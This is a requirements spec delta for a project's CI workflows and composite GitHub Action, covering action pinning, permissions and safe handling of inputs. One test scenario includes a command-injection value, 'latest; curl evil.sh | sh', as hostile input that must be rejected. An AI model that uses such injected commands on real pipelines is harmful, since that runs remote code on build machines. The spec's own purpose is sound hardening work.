# Spec Delta: distribution

## MODIFIED Requirements

### Requirement: Continuous integration
CI SHALL run lint, typecheck and unit tests on Linux, macOS and Windows, and e2e plus the pack smoke test on Linux, for every push and pull request. Releases SHALL go through changesets. Every workflow and `action.yml` SHALL reference third-party actions by full commit SHA (the version tag in a trailing comment), and a workflow without a `permissions:` block MUST NOT exist; CI runs with `contents: read`.

#### Scenario: Pull request
- **WHEN** a pull request is opened
- **THEN** all CI jobs run and a failure blocks the check

#### Scenario: Unpinned action
- **WHEN** a workflow or `action.yml` contains `uses: actions/checkout@v4`
- **THEN** the unit tests fail naming the file and the reference

#### Scenario: Missing permissions
- **WHEN** a workflow file has no top-level `permissions:`
- **THEN** the unit tests fail naming the file

### Requirement: GitHub Action
The repository SHALL provide a composite GitHub Action (`action.yml`) with inputs `directory` (default `.`), `version` (default `latest`) and `args` (extra `test` flags) that installs the Chromium build matching the CLI's Playwright (`mcp-apps-studio install-browser`), runs `mcp-apps-studio test` in `directory`, uploads the output directory as an artifact even on failure, and fails the step when the test fails. Inputs MUST reach shell steps only through environment variables, never through `${{ }}` interpolation inside `run:`, and a `version` that is not a semver range or an npm dist-tag (letters, digits, `.`, `-`, `^`, `~`) SHALL fail the step before anything is installed.

#### Scenario: Using the action
- **WHEN** a workflow uses the action with `directory: widgets`
- **THEN** the job runs every story headlessly, attaches the report and screenshots, and is red on any failed run

#### Scenario: No interpolation in shell
- **WHEN** the unit tests inspect `action.yml`
- **THEN** no `run:` script contains `${{`

#### Scenario: Hostile version input
- **WHEN** the action runs with `version: 'latest; curl evil.sh | sh'`
- **THEN** the step fails with an invalid-version message and nothing is executed from the input
